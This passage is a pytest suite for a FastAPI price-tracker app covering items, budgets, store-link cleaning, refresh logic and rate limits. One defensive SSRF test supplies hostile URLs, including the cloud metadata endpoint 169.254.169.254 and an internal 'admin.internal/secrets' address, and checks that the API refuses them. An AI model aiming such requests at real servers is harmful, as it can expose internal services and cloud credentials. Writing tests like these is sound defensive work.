"""API tests: a real FastAPI app and a real database, but a fake extractor,
so no store is ever contacted.

Every test runs twice: on SQLite (a temp file) and on Postgres. The Postgres
run needs TEST_DATABASE_URL (an empty test database, wiped before each test);
without it, those runs are skipped, so the tests still work on any laptop."""

import os

import pytest
from fastapi.testclient import TestClient

import sqlite3
import db
import main
import services
from extractor import Product, clean_url

KEY = "test-key-long-enough-for-the-startup-check"
H = {"X-API-Key": KEY}

# Fake store catalogue: url -> what the extractor "finds" there.
CATALOGUE = {
    "https://amzn.in/d/watch": Product(url="https://www.amazon.in/dp/B0WATCH", ok=True,
                                       title="Fastrack Ryz Watch", price=1999, mrp=3499, method="amazon"),
    "https://www.fastrack.in/ryz.html": Product(url="https://www.fastrack.in/ryz.html", ok=True,
                                                title="Fastrack Ryz Women Smartwatch", price=2499, method="json-ld"),
    "https://www.savana.com/details/1": Product(url="https://www.savana.com/details/1", ok=True,
                                                title="Cherry Cable Cover", price=273, mrp=390, method="savana"),
    "https://blocked.example/p": Product(url="https://blocked.example/p", title="Mystery Item",
                                         error="Store returned HTTP 403"),
}


TEST_PG = os.getenv("TEST_DATABASE_URL")


def fake_resolve(host, port, **kwargs):
    """Look up website names without the network: anything ending in
    .internal points at a private address, everything else at a public one."""
    import ipaddress
    try:
        ip = str(ipaddress.ip_address(host))     # an address typed directly stays itself
    except ValueError:
        ip = "10.0.0.5" if host.endswith(".internal") else "93.184.216.34"
    return [(2, 1, 6, "", (ip, port))]


def _wipe_postgres(url):
    """Start each Postgres test from empty tables, like a fresh SQLite file."""
    import psycopg
    with psycopg.connect(url) as conn:
        conn.execute("DROP TABLE IF EXISTS status_changes, price_history, links, items, settings CASCADE")


@pytest.fixture(params=["sqlite", "postgres"])
def client(request, tmp_path, monkeypatch):
    monkeypatch.setenv("ONTRACK_API_KEY", KEY)
    if request.param == "postgres":
        if not TEST_PG:
            pytest.skip("TEST_DATABASE_URL not set")
        _wipe_postgres(TEST_PG)
        monkeypatch.setenv("DATABASE_URL", TEST_PG)
    else:
        monkeypatch.delenv("DATABASE_URL", raising=False)   # even if .env sets one
        monkeypatch.setenv("ONTRACK_DB", str(tmp_path / "test.db"))
    monkeypatch.setattr(services, "REFRESH_DELAY", (0, 0))
    catalogue = dict(CATALOGUE)

    def fake_extract(url):
        if url in catalogue:
            return catalogue[url]
        # refresh() calls with the stored (final) URL
        return next(p for p in catalogue.values() if p.url == url)

    main.app.dependency_overrides[main.get_extract] = lambda: fake_extract
    main.app.dependency_overrides[main.get_resolver] = lambda: fake_resolve
    main.rate_limiter.reset()                # each test starts with a fresh request count
    with TestClient(main.app) as c:          # `with` runs startup (creates tables)
        c.catalogue = catalogue              # tests can change "store prices"
        c.backend = request.param            # "sqlite" or "postgres"
        yield c
    main.app.dependency_overrides.clear()


def test_requires_api_key(client):
    assert client.get("/summary").status_code == 422                      # header missing
    assert client.get("/summary", headers={"X-API-Key": "wrong"}).status_code == 401
    assert client.get("/health").status_code == 200                       # public


def test_add_from_link_uses_product_title_and_short_link_resolves(client):
    r = client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H)
    assert r.status_code == 201
    item = r.json()
    assert item["name"] == "Fastrack Ryz Watch"
    assert item["price"] == 1999 and item["mrp"] == 3499
    assert item["links"][0]["url"] == "https://www.amazon.in/dp/B0WATCH"


def test_cheapest_link_wins_and_total_counts_item_once(client):
    item = client.post("/items/from-link", json={"url": "https://www.fastrack.in/ryz.html",
                                                  "name": "Smartwatch"}, headers=H).json()
    assert item["price"] == 2499
    item = client.post(f"/items/{item['id']}/links", json={"url": "https://amzn.in/d/watch"}, headers=H).json()
    assert len(item["links"]) == 2 and item["price"] == 1999      # Amazon is cheaper

    s = client.get("/summary", headers=H).json()
    assert s["planned_total"] == 1999                               # not 1999 + 2499


def test_duplicate_link_rejected_even_via_short_link(client):
    client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H)
    r = client.post("/items/from-link", json={"url": "https://www.amazon.in/dp/B0WATCH?psc=1"}, headers=H)
    assert r.status_code == 409
    assert len(client.get("/items", headers=H).json()) == 1        # no empty item left behind


def test_failed_extraction_still_saves_item_for_manual_price(client):
    item = client.post("/items/from-link", json={"url": "https://blocked.example/p"}, headers=H).json()
    assert item["name"] == "Mystery Item" and item["needs_price"]
    assert "403" in item["links"][0]["last_error"]
    item = client.patch(f"/items/{item['id']}", json={"manual_price": 500}, headers=H).json()
    assert item["price"] == 500 and not item["needs_price"]


def test_summary_budget_mrp_and_what_fits(client):
    client.put("/budget", json={"amount": 2000}, headers=H)
    client.post("/items/from-link", json={"url": "https://amzn.in/d/watch", "priority": 2}, headers=H)
    client.post("/items/from-link", json={"url": "https://www.savana.com/details/1", "priority": 1}, headers=H)
    client.post("/items", json={"name": "Charm bracelet", "price": 1500}, headers=H)

    s = client.get("/summary", headers=H).json()
    assert s["planned_total"] == 1999 + 273 + 1500
    assert s["remaining"] == 2000 - (1999 + 273 + 1500)
    assert s["savings_vs_mrp"] == (3499 - 1999) + (390 - 273)      # discounted total, MRP alongside
    fits = {i["name"]: i["fits_budget"] for i in s["items"]}
    assert fits == {"Fastrack Ryz Watch": True, "Cherry Cable Cover": False, "Charm bracelet": False}


def test_unplanned_items_dont_count(client):
    client.post("/items", json={"name": "Maybe later", "price": 999}, headers=H)
    item = client.post("/items", json={"name": "Needed", "price": 100}, headers=H).json()
    first = client.get("/items", headers=H).json()[0]
    client.patch(f"/items/{first['id']}", json={"status": "later"}, headers=H)
    assert client.get("/summary", headers=H).json()["planned_total"] == 100


def test_refresh_cooldown_force_and_price_history(client):
    item = client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"}, headers=H).json()

    r = client.post("/refresh", headers=H).json()                 # just checked -> skipped
    assert r["checked"] == 0 and r["skipped_recent"] == 1

    client.catalogue["https://www.savana.com/details/1"] = Product(
        url="https://www.savana.com/details/1", ok=True, title="Cherry Cable Cover",
        price=250, mrp=390, method="savana")                          # store drops the price
    r = client.post("/refresh?force=true", headers=H).json()
    assert r["changed"] == [{"link_id": item["links"][0]["id"], "old_price": 273, "new_price": 250}]

    link = client.get(f"/items/{item['id']}", headers=H).json()["links"][0]
    assert link["price"] == 250 and link["price_when_saved"] == 273
    assert link["previous_price"] == 273 and link["lowest_price_seen"] == 250


def test_failed_refresh_keeps_last_price(client):
    item = client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"}, headers=H).json()
    client.catalogue["https://www.savana.com/details/1"] = Product(
        url="https://www.savana.com/details/1", error="Amazon showed a bot-check page")
    r = client.post(f"/items/{item['id']}/refresh", headers=H).json()
    assert r["failed"] and r["item"]["price"] == 273              # last known price kept
    assert "bot-check" in r["item"]["links"][0]["last_error"]


def test_delete_cascades(client):
    item = client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H).json()
    assert client.delete(f"/items/{item['id']}", headers=H).status_code == 204
    assert client.get(f"/items/{item['id']}", headers=H).status_code == 404
    # link row was removed too, so the same URL can be saved again
    assert client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H).status_code == 201


def test_status_moves_are_logged(client, tmp_path):
    item = client.post("/items", json={"name": "Milk frother", "price": 439}, headers=H).json()
    url = f"/items/{item['id']}"
    client.patch(url, json={"status": "later"}, headers=H)
    client.patch(url, json={"status": "later"}, headers=H)      # already later: must NOT be logged
    client.patch(url, json={"status": "planned"}, headers=H)

    conn = db.connect()                      # whichever database this run uses
    rows = conn.execute(
        "SELECT from_status, to_status FROM status_changes WHERE item_id = ? ORDER BY id",
        (item["id"],)).fetchall()
    conn.close()
    moves = [(r["from_status"], r["to_status"]) for r in rows]
    assert moves == [(None, "planned"), ("planned", "later"), ("later", "planned")]


def test_mark_bought_saves_price_and_date_undo_clears(client):
    item = client.post("/items", json={"name": "MARS lipstick", "price": 237}, headers=H).json()

    item = client.patch(f"/items/{item['id']}", json={"status": "purchased"}, headers=H).json()
    assert item["purchased_price"] == 237 and item["purchased_at"] is not None

    item = client.patch(f"/items/{item['id']}", json={"status": "planned"}, headers=H).json()
    assert item["purchased_price"] is None and item["purchased_at"] is None


def test_spent_this_month_comes_off_the_budget(client):
    client.put("/budget", json={"amount": 1000}, headers=H)
    bought = client.post("/items", json={"name": "Concealer", "price": 400}, headers=H).json()
    client.post("/items", json={"name": "Bottle brush", "price": 170}, headers=H)
    client.patch(f"/items/{bought['id']}", json={"status": "purchased"}, headers=H)

    s = client.get("/summary", headers=H).json()
    assert s["spent_this_month"] == 400
    assert s["planned_total"] == 170                    # bought item no longer planned
    assert s["remaining"] == 1000 - 400 - 170


def test_refresh_skips_bought_items(client):
    item = client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"}, headers=H).json()
    client.patch(f"/items/{item['id']}", json={"status": "purchased"}, headers=H)
    client.catalogue["https://www.savana.com/details/1"] = Product(
        url="https://www.savana.com/details/1", ok=True, title="Cherry Cable Cover",
        price=199, mrp=390, method="savana")                    # store price changes

    r = client.post("/refresh?force=true", headers=H).json()
    assert r["checked"] == 0                                    # bought item not fetched
    assert client.get(f"/items/{item['id']}", headers=H).json()["price"] == 273

def test_items_filtered_by_status(client):
    client.post("/items", json={"name": "Watch", "price": 1999}, headers=H)
    frother = client.post("/items", json={"name": "Frother", "price": 439}, headers=H).json()
    client.patch(f"/items/{frother['id']}", json={"status": "later"}, headers=H)

    def names(status):
        return [i["name"] for i in client.get(f"/items?status={status}", headers=H).json()]

    assert names("planned") == ["Watch"]
    assert names("later") == ["Frother"]
    assert names("purchased") == []
    assert sorted(names("all")) == ["Frother", "Watch"]
    assert client.get("/items?status=latr", headers=H).status_code == 422

def test_purchased_price_can_be_set_and_edited(client):
    item = client.post("/items", json={"name": "Frother", "price": 439}, headers=H).json()
    url = f"/items/{item['id']}"

    item = client.patch(url, json={"status": "purchased", "purchased_price": 399}, headers=H).json()
    assert item["purchased_price"] == 399                        # your price beats the listed 439

    item = client.patch(url, json={"purchased_price": 380}, headers=H).json()
    assert item["purchased_price"] == 380                        # editable afterwards

    other = client.post("/items", json={"name": "Brush", "price": 170}, headers=H).json()
    other = client.patch(f"/items/{other['id']}", json={"purchased_price": 100}, headers=H).json()
    assert other["purchased_price"] is None                      # not bought -> ignored

def test_price_history_for_an_item(client):
    item = client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"}, headers=H).json()
    client.catalogue["https://www.savana.com/details/1"] = Product(
        url="https://www.savana.com/details/1", ok=True, title="Cherry Cable Cover",
        price=250, mrp=390, method="savana")
    client.post(f"/items/{item['id']}/refresh", headers=H)

    history = client.get(f"/items/{item['id']}/history", headers=H).json()
    assert [h["price"] for h in history] == [273, 250]          # saved, then dropped
    assert client.get("/items/999/history", headers=H).status_code == 404


def test_amazon_links_reduce_to_dp_asin():
    expected = "https://www.amazon.in/dp/B0DBJ7VRJ2"
    assert clean_url("https://www.amazon.in/dp/B0DBJ7VRJ2?_encoding=UTF8") == expected
    assert clean_url("https://www.amazon.in/Aesthetic-Highlighter/dp/B0DBJ7VRJ2/ref=sr_1_3?crid=X&th=1") == expected
    assert clean_url("https://www.amazon.in/gp/product/B0DBJ7VRJ2?pf_rd_r=ABC") == expected


PHONE_PAGE = (
    '<html><head><link rel="canonical" href="https://www.amazon.in/Pastel-Highlighters/dp/B0TESTHTML?s=bazaar"/></head>'
    '<body><span id="productTitle">Pastel Highlighters</span>'
    '<div class="priceToPay"><span class="a-offscreen">₹289</span></div></body></html>')


def test_add_from_phone_html_with_short_link(client):
    form = {"url": "https://amzn.in/d/xyz"}
    page = {"html": ("page.html", PHONE_PAGE, "text/html")}
    r = client.post("/items/from-html", data=form, files=page, headers=H)
    assert r.status_code == 201
    item = r.json()
    assert item["name"] == "Pastel Highlighters" and item["price"] == 289
    assert item["links"][0]["url"] == "https://www.amazon.in/dp/B0TESTHTML"   # from the canonical tag

    assert client.post("/items/from-html", data=form, files=page, headers=H).status_code == 409   # duplicate


def test_from_html_falls_back_to_server_for_other_stores(client):
    loading_page = "<html><title>Loading…</title></html>"           # e.g. a Savana share page
    form = {"url": "https://www.savana.com/details/1"}
    item = client.post("/items/from-html", data=form,
                       files={"html": ("p.html", loading_page, "text/html")}, headers=H).json()
    assert item["name"] == "Cherry Cable Cover" and item["price"] == 273   # came from the server fetch


def test_from_html_never_falls_back_for_amazon(client):
    no_price = '<html><body><span id="productTitle">Mystery Pen</span></body></html>'
    form = {"url": "https://www.amazon.in/dp/B0NOPRICE1"}
    item = client.post("/items/from-html", data=form,
                       files={"html": ("p.html", no_price, "text/html")}, headers=H).json()
    assert item["name"] == "Mystery Pen" and item["needs_price"]

def test_savana_links_keep_only_product_and_colour():
    expected = "https://www.savana.com/details/1789982?vid=6"
    assert clean_url("https://www.savana.com/details/1789982?vid=6&shem=aimgspe%2C") == expected
    assert clean_url("https://savana.com/details/printed-pullover-t-shirt-1789982?ub_cl=in_en-IN&vid=6") == expected
    assert clean_url("https://www.savana.com/details/1789982?vid=2") != expected      # another colour = another link


def test_phone_refresh_list_and_upload(client):
    item = client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H).json()
    client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"}, headers=H)

    due = client.get("/refresh/phone-list?force=true", headers=H).json()
    assert [d["url"] for d in due] == ["https://www.amazon.in/dp/B0WATCH"]    # Amazon only
    assert client.get("/refresh/phone-list", headers=H).json() == []         # just checked: cooldown

    page = ('<html><body><span id="productTitle">Fastrack Ryz Watch</span>'
            '<div class="priceToPay"><span class="a-offscreen">₹1,799</span></div></body></html>')
    upload = {"html": ("p.html", page, "text/html")}
    r = client.post(f"/links/{due[0]['link_id']}/from-html", files=upload, headers=H).json()
    assert r["ok"] and r["old_price"] == 1999 and r["new_price"] == 1799

    item = client.get(f"/items/{item['id']}", headers=H).json()
    assert item["price"] == 1799 and item["links"][0]["lowest_price_seen"] == 1799
    assert client.post("/links/999/from-html", files=upload, headers=H).status_code == 404




def test_database_not_locked_while_store_page_downloads(client, tmp_path):
    """While we wait for a slow store, other changes (like editing the budget)
    must still work. Before the fix, adding a link locked the database for the
    whole download, and every other change failed with 'database is locked'.
    SQLite only: Postgres locks single rows, not the whole database."""
    if client.backend == "postgres":
        pytest.skip("SQLite-only problem")
    results = []

    def slow_store(url):
        # Pretend the store is still sending its page. Meanwhile, try a write
        # from a second connection with no patience at all (timeout=0).
        other = sqlite3.connect(tmp_path / "test.db", timeout=0)
        try:
            other.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('budget', '5000')")
            other.commit()
            results.append("write worked")
        except sqlite3.OperationalError as exc:      # "database is locked"
            results.append(str(exc))
        finally:
            other.close()
        return Product(url=url, ok=True, title="Slow Store Lamp", price=999, method="json-ld")

    main.app.dependency_overrides[main.get_extract] = lambda: slow_store
    r = client.post("/items/from-link", json={"url": "https://slow.example/lamp"}, headers=H)

    assert r.status_code == 201
    assert r.json()["name"] == "Slow Store Lamp"
    assert results == ["write worked"]



def test_each_request_is_logged_when_it_starts(client, caplog):
    """Uvicorn only prints a request when it finishes, so a stuck one is invisible.
    We print a 'started' line first, so the terminal always shows what's running."""
    import logging
    with caplog.at_level(logging.INFO, logger="uvicorn.error"):
        client.get("/summary", headers=H)
    assert "started  GET /summary" in caplog.text



def test_phone_list_includes_links_with_no_price_even_if_just_checked(client):
    """If the server's own attempt failed (Amazon's bot-check), the link has no
    price. The phone should get it on the very next refresh, not an hour later."""
    client.catalogue["https://www.amazon.in/dp/B0BOTCHECK"] = Product(
        url="https://www.amazon.in/dp/B0BOTCHECK", method="amazon",
        error="Amazon showed a bot-check page instead of the product.")
    stuck = client.post("/items/from-link", json={"url": "https://www.amazon.in/dp/B0BOTCHECK"}, headers=H).json()
    client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H)   # has a price

    due = client.get("/refresh/phone-list", headers=H).json()      # both were checked seconds ago
    assert [d["link_id"] for d in due] == [stuck["links"][0]["id"]]   # only the one without a price



def test_adding_a_stuck_link_again_fills_it_in(client):
    """The server hit Amazon's bot-check, so the item has no name or price.
    Sharing the same link from the phone should fill in THAT item, not say
    'already saved' and not create a second copy."""
    client.catalogue["https://www.amazon.in/dp/B0BOTCHECK"] = Product(
        url="https://www.amazon.in/dp/B0BOTCHECK", method="amazon",
        error="Amazon showed a bot-check page instead of the product.")
    stuck = client.post("/items/from-link", json={"url": "https://www.amazon.in/dp/B0BOTCHECK"}, headers=H).json()
    assert stuck["needs_price"] and stuck["name"] == "https://www.amazon.in/dp/B0BOTCHECK"

    page = ('<html><body><span id="productTitle">Rose Gold Watch</span>'
            '<div class="priceToPay"><span class="a-offscreen">₹40,990</span></div></body></html>')
    r = client.post("/items/from-html", data={"url": "https://www.amazon.in/dp/B0BOTCHECK"},
                    files={"html": ("p.html", page, "text/html")}, headers=H)

    assert r.status_code == 201
    item = r.json()
    assert item["id"] == stuck["id"]                                  # same item, not a new one
    assert item["name"] == "Rose Gold Watch" and item["price"] == 40990
    assert len(client.get("/items", headers=H).json()) == 1           # still only one item

    # Once it HAS a price, adding it again is a normal duplicate.
    again = client.post("/items/from-html", data={"url": "https://www.amazon.in/dp/B0BOTCHECK"},
                        files={"html": ("p.html", page, "text/html")}, headers=H)
    assert again.status_code == 409



def test_flipkart_links_keep_only_the_product_code():
    """The same sneakers came in three ways (paste, clipboard, Share Sheet) with
    different extras after '?', so they were saved three times. All must clean
    to one link, so the duplicate check catches them."""
    expected = "https://www.flipkart.com/reefox-stylish-orange-casual-sneakers-men/p/itmbab39913cc43f"
    shared = ("https://www.flipkart.com/reefox-stylish-orange-casual-sneakers-men/p/itmbab39913cc43f"
              "?pid=SHOHRN6Z7HSXACHE&lid=LSTSHOHRN6Z7HSXACHEQFSUQT&marketplace=FLIPKART"
              "&store=osp%2Fcil&ctx=eyJkZWxpdmVyZWRCeSI6IiJ9&_appId=CL")
    assert clean_url(shared) == expected
    assert clean_url(expected) == expected                                        # already clean
    assert clean_url("https://dl.flipkart.com/dl/reefox-stylish-orange-casual-sneakers-men"
                     "/p/itmbab39913cc43f?pid=SHOHRN6Z7HSXACHE") == expected      # app deep link
    assert clean_url("https://www.flipkart.com/guess-u0291g4m-analog-watch-men/p/itmf1ccbe064d497") != expected




def test_refresh_gives_a_url_named_item_its_real_name(client):
    """A stuck item is named after its URL. When the phone's Refresh finally
    reads the page, the item should get the product's real name too, not just
    the price and photo."""
    client.catalogue["https://www.amazon.in/dp/B0BOTCHECK"] = Product(
        url="https://www.amazon.in/dp/B0BOTCHECK", method="amazon",
        error="Amazon showed a bot-check page instead of the product.")
    stuck = client.post("/items/from-link", json={"url": "https://www.amazon.in/dp/B0BOTCHECK"}, headers=H).json()
    renamed = client.post("/items/from-link", json={"url": "https://amzn.in/d/watch", "name": "My watch"},
                          headers=H).json()

    page = ('<html><body><span id="productTitle">Gold Mesh Watch</span>'
            '<div class="priceToPay"><span class="a-offscreen">₹1,999</span></div></body></html>')
    upload = {"html": ("p.html", page, "text/html")}
    client.post(f"/links/{stuck['links'][0]['id']}/from-html", files=upload, headers=H)
    client.post(f"/links/{renamed['links'][0]['id']}/from-html", files=upload, headers=H)

    assert client.get(f"/items/{stuck['id']}", headers=H).json()["name"] == "Gold Mesh Watch"
    assert client.get(f"/items/{renamed['id']}", headers=H).json()["name"] == "My watch"   # your own name stays



def test_add_by_hand_with_a_link_is_filled_in_later_by_refresh(client):
    """Adding by hand saves your name and price, and the link WITHOUT contacting
    the store. Refresh can then fetch the store's price and photo; the store's
    price replaces yours, but the name you typed stays."""
    def never_called(url):
        raise AssertionError("adding by hand must not contact the store")
    main.app.dependency_overrides[main.get_extract] = lambda: never_called

    r = client.post("/items", json={"name": "Rose gold watch", "price": 40000,
                                    "url": "https://www.amazon.in/Apple-Watch/dp/B0BOTCHECK?ref=xyz"}, headers=H)
    assert r.status_code == 201
    item = r.json()
    assert item["price"] == 40000 and not item["needs_price"]              # typed price counts now
    assert item["links"][0]["url"] == "https://www.amazon.in/dp/B0BOTCHECK"  # cleaned, not fetched
    assert item["links"][0]["price"] is None

    due = client.get("/refresh/phone-list", headers=H).json()             # no store price yet
    assert [d["link_id"] for d in due] == [item["links"][0]["id"]]

    page = ('<html><body><span id="productTitle">Apple Watch Series 11</span>'
            '<img id="landingImage" src="https://m.media-amazon.com/w.jpg">'
            '<div class="priceToPay"><span class="a-offscreen">₹38,990</span></div></body></html>')
    client.post(f"/links/{due[0]['link_id']}/from-html", files={"html": ("p.html", page, "text/html")}, headers=H)

    item = client.get(f"/items/{item['id']}", headers=H).json()
    assert item["price"] == 38990                     # the store's price wins
    assert item["manual_price"] == 40000              # yours is kept as a backup
    assert item["name"] == "Rose gold watch"          # your name stays
    assert item["image"] == "https://m.media-amazon.com/w.jpg"

    again = client.post("/items", json={"name": "Watch again", "price": 1,
                                        "url": "https://www.amazon.in/dp/B0BOTCHECK"}, headers=H)
    assert again.status_code == 409                   # same link: already saved


def test_add_by_hand_without_a_link_still_works(client):
    item = client.post("/items", json={"name": "Gift", "price": 2000}, headers=H).json()
    assert item["price"] == 2000 and item["links"] == []



def test_short_link_added_by_hand_becomes_the_real_link_after_a_check(client):
    """Adding by hand never contacts the store, so an amzn.in short link stays
    short. Once Refresh reads the page, the link should become the real
    /dp/ address, so sharing the same product later says 'already saved'."""
    item = client.post("/items", json={"name": "Alexa", "price": 2555,
                                       "url": "https://amzn.in/d/0ahlEBRm"}, headers=H).json()
    link_id = item["links"][0]["id"]
    assert item["links"][0]["url"] == "https://amzn.in/d/0ahlEBRm"            # nothing followed yet

    page = ('<html><head><link rel="canonical" href="https://www.amazon.in/Echo-Dot/dp/B0ECHODOT5"/></head>'
            '<body><span id="productTitle">Amazon Echo Dot (5th Gen)</span>'
            '<div class="priceToPay"><span class="a-offscreen">₹4,499</span></div></body></html>')
    upload = {"html": ("p.html", page, "text/html")}
    client.post(f"/links/{link_id}/from-html", files=upload, headers=H)

    item = client.get(f"/items/{item['id']}", headers=H).json()
    assert item["links"][0]["url"] == "https://www.amazon.in/dp/B0ECHODOT5"  # the real address now
    assert item["name"] == "Alexa" and item["price"] == 4499

    again = client.post("/items/from-html", data={"url": "https://www.amazon.in/dp/B0ECHODOT5"},
                        files=upload, headers=H)
    assert again.status_code == 409                                          # recognised as a duplicate




def test_server_refresh_skips_phone_only_stores(client):
    """The server never re-checks Amazon: from a server it gets bot-checked, and
    a failed check would hold back the phone's refresh of that item for an hour.
    Amazon prices are refreshed through the phone; other stores by the server."""
    amazon = client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H).json()
    client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"}, headers=H)

    asked = []
    def store(url):
        asked.append(url)
        return next(p for p in client.catalogue.values() if p.url == url)
    main.app.dependency_overrides[main.get_extract] = lambda: store

    r = client.post("/refresh?force=true", headers=H).json()
    assert asked == ["https://www.savana.com/details/1"]          # Amazon never contacted
    assert r["checked"] == 1 and r["phone_only"] == 1

    link = client.get(f"/items/{amazon['id']}", headers=H).json()["links"][0]
    due = client.get("/refresh/phone-list?force=true", headers=H).json()
    assert [d["link_id"] for d in due] == [link["id"]]             # still the phone's job




def test_already_saved_reply_names_the_link(client):
    """'Already saved' also says WHICH link, so the browser extension can offer
    'Update price' and send the page to /links/{link_id}/from-html."""
    item = client.post("/items/from-link", json={"url": "https://amzn.in/d/watch"}, headers=H).json()
    link_id = item["links"][0]["id"]

    r = client.post("/items/from-html", data={"url": "https://www.amazon.in/dp/B0WATCH"},
                    files={"html": ("p.html", PHONE_PAGE, "text/html")}, headers=H)
    assert r.status_code == 409
    assert r.json() == {"detail": "This link is already saved.", "item_id": item["id"], "link_id": link_id}

    page = ('<html><body><span id="productTitle">Fastrack Ryz Watch</span>'
            '<div class="priceToPay"><span class="a-offscreen">₹1,899</span></div></body></html>')
    upd = client.post(f"/links/{r.json()['link_id']}/from-html",
                      files={"html": ("p.html", page, "text/html")}, headers=H).json()
    assert upd["ok"] and upd["old_price"] == 1999 and upd["new_price"] == 1899

def test_links_to_private_addresses_are_refused(client):
    """SSRF: the server must never be pointed at its own private network."""
    for path, body in [("/items/from-link", {"url": "http://admin.internal/secrets"}),
                       ("/items", {"name": "Router", "price": 1, "url": "http://admin.internal/"}),
                       ("/items/from-link", {"url": "http://169.254.169.254/latest/meta-data/"}),
                       ("/items/from-link", {"url": "https://shop.example:8443/p"})]:
        r = client.post(path, json=body, headers=H)
        assert r.status_code == 400, (path, body, r.text)
        assert "won't open this link" in r.json()["detail"]
    item = client.post("/items", json={"name": "Lamp", "price": 999}, headers=H).json()
    r = client.post(f"/items/{item['id']}/links", json={"url": "http://admin.internal/"}, headers=H)
    assert r.status_code == 400
    assert len(client.get("/items", headers=H).json()) == 1         # nothing else was saved


def test_uploads_over_the_size_limit_are_refused(client):
    """A huge upload must be turned away before it fills the server's memory,
    even without a valid API key. A normal Amazon-sized page (~1.7 MB) still works."""
    big = b"<html>" + b"x" * (6 * 1024 * 1024) + b"</html>"           # 6 MB, over the 5 MB limit
    r = client.post("/items/from-html", data={"url": "https://www.savana.com/details/1"},
                    files={"html": ("page.html", big, "text/html")}, headers=H)
    assert r.status_code == 413 and "too big" in r.json()["detail"]
    r = client.post("/items/from-html", data={"url": "https://www.savana.com/details/1"},
                    files={"html": ("page.html", big, "text/html")}, headers={"X-API-Key": "wrong"})
    assert r.status_code == 413                                       # refused before the key is even checked
    assert client.get("/items", headers=H).json() == []

    normal = b"<html>" + b"x" * (1700 * 1024) + b"</html>"           # ~1.7 MB
    r = client.post("/items/from-html", data={"url": "https://www.savana.com/details/1"},
                    files={"html": ("page.html", normal, "text/html")}, headers=H)
    assert r.status_code == 201


def test_size_limit_counts_bytes_even_without_a_content_length():
    """Some senders don't say how big the upload is (chunked uploads). The limit
    counts the bytes that actually arrive, so leaving the header out doesn't help:
    the sender gets 413, and the app is told the sender left instead of getting
    the rest of the body."""
    import asyncio
    app_saw = []

    async def app(scope, receive, send):
        while True:
            message = await receive()
            app_saw.append(message["type"])
            if not message.get("more_body"):
                break
        await send({"type": "http.response.start", "status": 201, "headers": []})   # dropped

    limited = main.LimitRequestSize(app, max_bytes=100)
    chunks = [{"type": "http.request", "body": b"x" * 60, "more_body": True}] * 3
    sent = []

    async def receive():
        return chunks.pop(0)

    async def send(message):
        sent.append(message)

    asyncio.run(limited({"type": "http", "headers": []}, receive, send))
    assert app_saw == ["http.request", "http.disconnect"]          # 60 bytes, then "the sender left"
    starts = [m for m in sent if m["type"] == "http.response.start"]
    assert [m["status"] for m in starts] == [413]                   # only our answer goes out


def test_too_many_requests_get_429(client, monkeypatch):
    """Over the limit, requests are refused with 429 and told how long to wait."""
    monkeypatch.setattr(main, "RATE_LIMIT_HEAVY", 3)
    for _ in range(3):
        assert client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"},
                           headers=H).status_code in (201, 409)
    r = client.post("/items/from-link", json={"url": "https://www.savana.com/details/1"}, headers=H)
    assert r.status_code == 429 and int(r.headers["Retry-After"]) >= 1
    assert client.get("/summary", headers=H).status_code == 200      # light requests still work

    monkeypatch.setattr(main, "RATE_LIMIT", 5)
    codes = [client.get("/summary", headers=H).status_code for _ in range(6)]
    assert codes.count(429) >= 1                                      # the general limit too
    assert client.get("/health").status_code == 200                   # the health check is never limited


def test_rate_limit_window_slides_and_counts_each_address_separately():
    now = [0.0]
    limiter = main.RateLimiter(clock=lambda: now[0])
    assert all(limiter.allow("1.2.3.4", "heavy", 2) == 0 for _ in range(2))
    assert limiter.allow("1.2.3.4", "heavy", 2) > 0                   # third in the same minute
    assert limiter.allow("5.6.7.8", "heavy", 2) == 0                  # someone else isn't affected
    now[0] = 59.0
    assert limiter.allow("1.2.3.4", "heavy", 2) > 0                   # still inside the last 60 s
    now[0] = 60.5
    assert limiter.allow("1.2.3.4", "heavy", 2) == 0                  # the first two have expired

def test_spent_this_month_follows_india_time_not_utc(client, monkeypatch):
    """Stored times are UTC, which is 5.5 hours behind India. A purchase at 00:30
    on 1 Nov in India is still 31 Oct in UTC: it belongs to November's budget."""
    from datetime import datetime, timezone
    def at(stamp):
        monkeypatch.setattr(services, "_utcnow", lambda: datetime.fromisoformat(stamp))

    client.put("/budget", json={"amount": 5000}, headers=H)
    late = client.post("/items", json={"name": "Late-night kurta", "price": 700}, headers=H).json()
    early = client.post("/items", json={"name": "Halloween mask", "price": 300}, headers=H).json()
    at("2026-10-31T19:00:00+00:00")                       # 1 Nov, 00:30 in India
    client.patch(f"/items/{late['id']}", json={"status": "purchased"}, headers=H)
    at("2026-10-31T18:00:00+00:00")                       # 31 Oct, 23:30 in India
    client.patch(f"/items/{early['id']}", json={"status": "purchased"}, headers=H)

    at("2026-11-05T06:00:00+00:00")                       # looking at the app on 5 Nov
    assert client.get("/summary", headers=H).json()["spent_this_month"] == 700

    monkeypatch.setenv("ONTRACK_TIMEZONE", "UTC")         # the old behaviour, for contrast
    assert client.get("/summary", headers=H).json()["spent_this_month"] == 0


def test_a_misspelt_time_zone_stops_the_server_at_startup(tmp_path, monkeypatch):
    monkeypatch.setenv("ONTRACK_API_KEY", KEY)
    monkeypatch.delenv("DATABASE_URL", raising=False)
    monkeypatch.setenv("ONTRACK_DB", str(tmp_path / "tz.db"))
    monkeypatch.setenv("ONTRACK_TIMEZONE", "Asia/Kolkatta")
    with pytest.raises(RuntimeError, match="isn't a time zone"):
        with TestClient(main.app):
            pass

# ------------------------------------------------------------ security sweep

def test_a_weak_api_key_stops_the_server_at_startup(tmp_path, monkeypatch):
    monkeypatch.delenv("DATABASE_URL", raising=False)
    monkeypatch.setenv("ONTRACK_DB", str(tmp_path / "k.db"))
    for weak in ("change-me", "short-key"):
        monkeypatch.setenv("ONTRACK_API_KEY", weak)
